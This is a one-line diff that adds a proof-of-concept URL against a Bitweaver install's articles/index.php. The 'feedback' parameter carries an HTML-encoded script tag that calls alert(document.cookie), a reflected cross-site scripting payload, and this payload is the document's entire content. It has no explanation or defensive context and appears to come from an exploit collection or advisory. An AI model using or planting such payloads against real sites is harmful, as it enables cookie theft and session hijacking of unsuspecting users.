@@ -1,0 +1,1 @@
+http://www.example.com/[path_to_bitweaver]/articles/index.php?feedback=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
